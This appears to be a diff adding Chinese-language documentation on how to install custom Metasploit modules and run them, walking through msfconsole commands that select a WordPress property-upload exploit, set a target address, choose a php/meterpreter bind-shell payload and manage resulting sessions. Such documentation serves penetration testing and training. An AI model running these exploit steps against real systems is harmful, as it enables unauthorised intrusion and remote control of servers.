@@ -52,6 +52,96 @@
             
   <div class="section" id="id1">
 <h1>使用流程<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h1>
+<p>将开放的模块放置metasploit安装目录的apps/pro/msf3/modules目录下，辅助模块放置在auxiliary目录下，利用模块放置在exploits目录下。</p>
+<p>启动运行环境</p>
+<div class="highlight-python"><div class="highlight"><pre><span class="n">msfconsole</span>
+</pre></div>
+</div>
+<p>运行环境启动完成</p>
+<p>如果运行环境正确启动，会看到类似效果:</p>
+<img alt="_images/1.4.3.png" src="_images/1.4.3.png" />
+<p><strong>查找提交的模块</strong></p>
+<p>命令:</p>
+<div class="highlight-python"><div class="highlight"><pre><span class="n">search</span>
+</pre></div>
+</div>
+<p>示例:</p>
+<div class="highlight-python"><div class="highlight"><pre>search wp_property_upload_exec
+</pre></div>
+</div>
+<p>效果:</p>
+<img alt="_images/1.4.4.png" src="_images/1.4.4.png" />
+<p><strong>使用模块</strong></p>
+<p>命令:</p>
+<div class="highlight-python"><div class="highlight"><pre><span class="n">use</span>
+</pre></div>
+</div>
+<p>示例:</p>
+<div class="highlight-python"><div class="highlight"><pre>use exploit/unix/webapp/wp_property_upload_exec
+</pre></div>
+</div>
+<p>效果:</p>
+<img alt="_images/1.4.5.png" src="_images/1.4.5.png" />
+<p><strong>查看该模块的配置信息</strong></p>
+<p>命令:</p>
+<div class="highlight-python"><div class="highlight"><pre><span class="n">show</span>
+</pre></div>
+</div>
+<p>示例:</p>
+<div class="highlight-python"><div class="highlight"><pre>show options
+</pre></div>
+</div>
+<p>效果:</p>
+<img alt="_images/1.4.6.png" src="_images/1.4.6.png" />
+<p>或者使用命令 <code class="docutils literal"><span class="pre">info</span></code> 查看该模块更详细的信息</p>
+<p>示例:</p>
+<img alt="_images/1.4.7.png" src="_images/1.4.7.png" />
+<p><strong>设置参数</strong></p>
+<p>命令:</p>
+<div class="highlight-python"><div class="highlight"><pre><span class="nb">set</span>
+</pre></div>
+</div>
+<p>示例:</p>
+<div class="highlight-python"><div class="highlight"><pre>set RHOST 192.168.0.110
+</pre></div>
+</div>
+<p>效果:</p>
+<img alt="_images/1.4.8.png" src="_images/1.4.8.png" />
+<p><strong>指定PAYLOAD</strong></p>
+<p>在设置该模块的PAYLOAD之前需要查看该模块可用的PAYLOAD有哪些，可使用命令 <code class="docutils literal"><span class="pre">show</span> <span class="pre">payloads</span></code> 查看，示例如下:</p>
+<div class="highlight-python"><div class="highlight"><pre>.. image:: image/1.4.9.png
+</pre></div>
+</div>
+<p>从所列出的PAYLOAD中选择自己熟悉的PAYLOAD使用</p>
+<p>命令:</p>
+<div class="highlight-python"><div class="highlight"><pre>set PAYLOAD
+</pre></div>
+</div>
+<p>示例:</p>
+<div class="highlight-python"><div class="highlight"><pre>set PAYLOAD php/meterpreter/bind_tcp
+</pre></div>
+</div>
+<p>效果:</p>
+<img alt="_images/1.4.10.png" src="_images/1.4.10.png" />
+<p>PAYLOAD指定之后需要对PAYLOAD的参数进行相关设置，此处不再列举</p>
+<p><strong>运行模块</strong></p>
+<p>命令:</p>
+<div class="highlight-python"><div class="highlight"><pre>exploit 或 run
+</pre></div>
+</div>
+<p><strong>其它常用命令</strong></p>
+<p>查看会话</p>
+<div class="highlight-python"><div class="highlight"><pre><span class="n">sessions</span> <span class="o">-</span><span class="n">l</span>
+</pre></div>
+</div>
+<p>指定会话</p>
+<div class="highlight-python"><div class="highlight"><pre><span class="n">sessions</span> <span class="o">-</span><span class="n">i</span>
+</pre></div>
+</div>
+<div class="admonition note">
+<p class="first admonition-title">注解</p>
+<p class="last">此文档未列出获取会话之后所需要的操作命令，用户可在会话终端下通过help命令进行了解。</p>
+</div>
 </div>
 
 
